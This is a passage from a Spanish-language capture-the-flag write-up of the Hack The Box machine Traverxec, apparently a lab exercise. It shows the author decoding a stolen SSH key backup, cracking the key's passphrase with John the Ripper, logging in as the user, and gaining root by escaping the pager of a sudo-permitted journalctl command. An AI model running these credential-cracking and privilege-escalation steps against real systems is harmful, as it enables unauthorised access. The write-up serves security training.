FsQST097rqEH6iS1VxYeXwiG6LC43HOnXeZ3Jz5d8TpC9eRRuPBwPiFjC8z8ncj9fWFY/5RhAvZY
1bBlJ7kGzd54JbMspqfUPNde7KZigtS36aApT6T31qSQmVIApga1c9ORj0NuHIhMl5QnYOeQ6ydK
DosbDNdsi2QVw6lUdlFiyK9blGcUvBAPwjGoEaA5dhC6k64xDKIOGm4hEDv04mzlN38RJ+esB1kn
0ZlsipmJzcY4uyCOP+K8wS8YDF6BQVqhaQuUxntmugM56hklYxQso4sy7ElUU3p4iBfras5rLybx
5lC2Kva9vpWRcUxzBGDPcz8wmSRaFsVfigB1uUfrGJB8B41Dtq5KMm2yhzhxcAYJl5fz4xQiRDP5
1jEzhXMFQEo6ihUnhNc0R25hTn0Qpf4wByp8N/mdGQRmPmmLF5bBI6jKiy7mLbI76XmW2CfN+IBq
mVm0rRDvU9dVihl7v0I1RmcWK2ZCYZe0KSRBVnCt/JijvovyLdiQBDe6AG6cgjoBPnvEukh3ibGF
d+Y2jFh8u/ZMm/q5cCXEcCHTMZrciH6sMoRFFYj3mxCr8zoz8w3XS6A8O0y4xPKsbNzRZH3vVBds
Mp0nVIv0rOC3OtfgTH8VToU/eXl+JhaeR5+Ja+pwZ885cLEgqV9sOL2z980ytld9cr8/naK4ronU
pOjDYVkbMcz1NuG0M9zREGPuUJfHsEa6y9kAKjiysZfjPJ+a2baPreUGga1d1TG35A7mL4R9SuII
FBvJDLdSdqgqkSnIi8wLRtDTBHhZ0NzFK+hKjaPxgW7LyAY1d3hic2jVzrrgBBD3sknSz4fT3irm
6Zqg5SFeLGgaD67A12wlmPwvZ7E/O8v+9/LL9d+P3Rx/vxj/0fmPwL7Uf19+F7zrvz+A9/nvr33+
e/PmzZs3b968efPmzZs3b968efPmzf8vfweR13qfACgAAA==
```

Copiamos y pegamos dentro de un archivo local. Acto seguido, descomprimamos el archivo:

``` text
tony@laptop:~/htb/traverxec$ vim backup-ssh-identity-files.tgz.b64
tony@laptop:~/htb/traverxec$ base64 -d backup-ssh-identity-files.tgz.b64 > backup-ssh-identity-files.tgz
tony@laptop:~/htb/traverxec$ file backup-ssh-identity-files.tgz
backup-ssh-identity-files.tgz: gzip compressed data, last modified: Fri Oct 25 21:02:59 2019, from Unix, original size modulo 2^32 10240
tony@laptop:~/htb/traverxec$ tar tfz backup-ssh-identity-files.tgz
home/david/.ssh/
home/david/.ssh/authorized_keys
home/david/.ssh/id_rsa
home/david/.ssh/id_rsa.pub
tony@laptop:~/htb/traverxec$ tar xfz backup-ssh-identity-files.tgz
tony@laptop:~/htb/traverxec$ ssh -i home/david/.ssh/id_rsa david@10.10.10.165
Enter passphrase for key 'home/david/.ssh/id_rsa':
Enter passphrase for key 'home/david/.ssh/id_rsa':
Enter passphrase for key 'home/david/.ssh/id_rsa':
david@10.10.10.165's password:

tony@laptop:~/htb/traverxec$
```

Como podemos ver, no pudimos establecer la conexión debido a que necesitamos credenciales para acceder a la llave privada de david, así que, hagamos un poco de fuerza bruta contra esta protección:

## Crack the ssh key password

JohnTheRipper tiene un script en python para obtener el hash correspondiente a la protección de contraseña que se da en RSA. Ejecutamos este script contra el backup y obtenemos el siguiente hash:

``` text
tony@laptop:~/htb/traverxec$ ~/git/JohnTheRipper/run/ssh2john.py home/david/.ssh/id_rsa
home/david/.ssh/id_rsa:$sshng$1$16$477EEFFBA56F9D283D349033D5D08C4F$1200$b1ec9e1ff7de1b5f5395468c76f1d92bfdaa7f2f29c3076bf6c83be71e213e9249f186ae856a2b08de0b3c957ec1f086b6e8813df672f993e494b90e9de220828aee2e45465b8938eb9d69c1e9199e3b13f0830cde39dd2cd491923c424d7dd62b35bd5453ee8d24199c733d261a3a27c3bc2d3ce5face868cfa45c63a3602bda73f08e87dd41e8cf05e3bb917c0315444952972c02da4701b5da248f4b1725fc22143c7eb4ce38bb81326b92130873f4a563c369222c12f2292fac513f7f57b1c75475b8ed8fc454582b1172aed0e3fcac5b5850b43eee4ee77dbedf1c880a27fe906197baf6bd005c43adbf8e3321c63538c1abc90a79095ced7021cbc92ffd1ac441d1dd13b65a98d8b5e4fb59ee60fcb26498729e013b6cff63b29fa179c75346a56a4e73fbcc8f06c8a4d5f8a3600349bb51640d4be260aaf490f580e3648c05940f23c493fd1ecb965974f464dea999865cfeb36408497697fa096da241de33ffd465b3a3fab925703a8e3cab77dc590cde5b5f613683375c08f779a8ec70ce76ba8ecda431d0b121135512b9ef486048052d2cfce9d7a479c94e332b92a82b3d609e2c07f4c443d3824b6a8b543620c26a856f4b914b38f2cfb3ef6780865f276847e09fe7db426e4c319ff1e810aec52356005aa7ba3e1100b8dd9fa8b6ee07ac464c719d2319e439905ccaeb201bae2c9ea01e08ebb9a0a9761e47b841c47d416a9db2686c903735ebf9e137f3780b51f2b5491e50aea398e6bba862b6a1ac8f21c527f852158b5b3b90a6651d21316975cd543709b3618de2301406f3812cf325d2986c60fdb727cadf3dd17245618150e010c1510791ea0bec870f245bf94e646b72dc9604f5acefb6b28b838ba7d7caf0015fe7b8138970259a01b4793f36a32f0d379bf6d74d3a455b4dd15cda45adcfdf1517dca837cdaef08024fca3a7a7b9731e7474eddbdd0fad51cc7926dfbaef4d8ad47b1687278e7c7474f7eab7d4c5a7def35bfa97a44cf2cf4206b129f8b28003626b2b93f6d01aea16e3df597bc5b5138b61ea46f5e1cd15e378b8cb2e4ffe7995b7e7e52e35fd4ac6c34b716089d599e2d1d1124edfb6f7fe169222bc9c6a4f0b6731523d436ec2a15c6f147c40916aa8bc6168ccedb9ae263aaac078614f3fc0d2818dd30a5a113341e2fcccc73d421cb711d5d916d83bfe930c77f3f99dba9ed5cfcee020454ffc1b3830e7a1321c369380db6a61a757aee609d62343c80ac402ef8abd56616256238522c57e8db245d3ae1819bd01724f35e6b1c340d7f14c066c0432534938f5e3c115e120421f4d11c61e802a0796e6aaa5a7f1631d9ce4ca58d67460f3e5c1cdb2c5f6970cc598805abb386d652a0287577c453a159bfb76c6ad4daf65c07d386a3ff9ab111b26ec2e02e5b92e184e44066f6c7b88c42ce77aaa918d2e2d3519b4905f6e2395a47cad5e2cc3b7817b557df3babc30f799c4cd2f5a50b9f48fd06aaf435762062c4f331f989228a6460814c1c1a777795104143630dc16b79f51ae2dd9e008b4a5f6f52bb4ef38c8f5690e1b426557f2e068a9b3ef5b4fe842391b0af7d1e17bfa43e71b6bf16718d67184747c8dc1fcd1568d4b8ebdb6d55e62788553f4c69d128360b407db1d278b5b417f4c0a38b11163409b18372abb34685a30264cdfcf57655b10a283ff0
tony@laptop:~/htb/traverxec$ ~/git/JohnTheRipper/run/ssh2john.py home/david/.ssh/id_rsa > sshkey.hash
```

Ahora ejecutamos `JTR` contra este hash utilizando como diccionario **rockyou.txt**:

``` text
tony@laptop:~/htb/traverxec$ ~/git/JohnTheRipper/run/john sshkey.hash --wordlist=/home/tony/wl/rockyou.txt2
Note: This format may emit false positives, so it will keep trying even after finding a
possible candidate.
Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
Use the "--format=ssh-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (home/david/.ssh/id_rsa)
1g 0:00:00:07 3.91% (ETA: 22:54:46) 0.1347g/s 87210p/s 87210c/s 87210C/s imtihan..imporio
Session aborted
```

Como resultado, encontramos que la protección es _hunter_.

> id_rsa:hunter

## SSH as David (again)

Ahora si, nos conectamos como david utilizando la llave:

``` text
tony@laptop:~/htb/traverxec$ ssh -i home/david/.ssh/id_rsa david@10.10.10.165
Enter passphrase for key 'home/david/.ssh/id_rsa':
Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
david@traverxec:~$ id
uid=1000(david) gid=1000(david) groups=1000(david),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
```

Perfecto, ahora que hemos entrado como david, observaremos que en el home se encuentra el archivo **user.txt**.

# user.txt

``` text
david@traverxec:~$ cat user.txt
<miau>
```

# Privilege Escalation

Ahora que somos david, tratemos de subir desde este usuario a root.

## from david to root

Lo primero que nos llama la atención es la existencia de la carpeta bin, asi que listemos su contenido:

``` text
david@traverxec:~$ ls bin
server-stats.head  server-stats.sh
david@traverxec:~$ cat bin/server-stats.head
                                                                          .----.
                                                              .---------. | == |
   Webserver Statistics and Data                              |.-"""""-.| |----|
         Collection Script                                    ||       || | == |
          (c) David, 2019                                     ||       || |----|
                                                              |'-.....-'| |::::|
                                                              '"")---(""' |___.|
                                                             /:::::::::::\"    "
                                                            /:::=======:::\
                                                        jgs '"""""""""""""'

david@traverxec:~$ cat bin/server-stats.sh
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```

Esta ultima linea resulta sumamente interesante, ya que nos indica la existencia de que podemos ejecutar journalctl como root. Probemos para verificar de los dos modos. Primero tratemos de obtener los comandos validos vía sudo para david:

``` text
david@traverxec:~$ sudo -l
[sudo] password for david:
Sorry, try again.
[sudo] password for david:
Sorry, try again.
[sudo] password for david:
sudo: 3 incorrect password attempts
david@traverxec:~$
```

Sorpresa, no tenemos la contraseña de david. Ahora tratemos de ejecutar el comando tal cual aparece en el script:

``` text
david@traverxec:~$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Fri 2020-03-20 23:50:48 EDT, end at Sat 2020-03-21 00:58:16 EDT. --
Mar 20 23:50:52 traverxec nhttpd[442]: started
Mar 20 23:50:52 traverxec nhttpd[442]: max. file descriptors = 1040 (cur) / 1040 (max)
Mar 20 23:50:52 traverxec systemd[1]: Started nostromo nhttpd server.
Mar 21 00:38:39 traverxec su[819]: pam_unix(su-l:auth): authentication failure; logname= uid=33 euid=0 tty= ruser=www-data rhost=  user=david
Mar 21 00:38:41 traverxec su[819]: FAILED SU (to david) www-data on none
```

El comando se ejecuta sin problemas. Probemos ahora cambiar un parámetro para aumentar el numero de lineas listadas por journalctl:

``` text
david@traverxec:~$ /usr/bin/sudo /usr/bin/journalctl -n10 -unostromo.service
[sudo] password for david:
^Csudo: 1 incorrect password attempt
```

Recibimos un error ya que el comando explícitamente permitido, especifica también el parámetro `-n5`.

Ahora, si revisamos [https://gtfobins.github.io/gtfobins/journalctl/#sudo](https://gtfobins.github.io/gtfobins/journalctl/#sudo) observaremos que para tener acceso completo al ambiente desde donde se ejecuta sudo, el ambiente de root, debemos escapar del pager (/bin/less) que atrapa la salida del comando y se encarga de desplegar cuando el buffer es saturado.

Para hacer el trigger de este evento, la manera fácil, consiste en reducir el tamaño de la ventana donde estamos trabajando a 5 o menos lineas, y ejecutar el comando con sudo. De esta manera al leerse la capacidad de la shell desde donde se ejecuta, el pager entregara la salida por `paginas`. Como `-n5` se refiere a solo desplegar 5 lineas, ajustamos este tamaño para forzar el pager.

``` text
david@traverxec:~$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
-- Logs begin at Fri 2020-03-20 23:50:48 EDT, end at Sat 2020-03-21 01:06:49 EDT. --
Mar 20 23:50:52 traverxec nhttpd[442]: started
!/bin/bash
root@traverxec:/home/david# id
uid=0(root) gid=0(root) groups=0(root)
root@traverxec:/home/david#
```

Ya que escapemos del pager como root via `!/bin/bash`, podemos hacer el resize de la ventana y ejecutar reset.

# root.txt

Ahora solo realizamos un cat de la flag, y acabamos con esta maquina.

``` text
root@traverxec:/home/david# cat /root/root.txt
<miau>
```

---

Gracias por llegar hasta aquí, hasta la próxima!
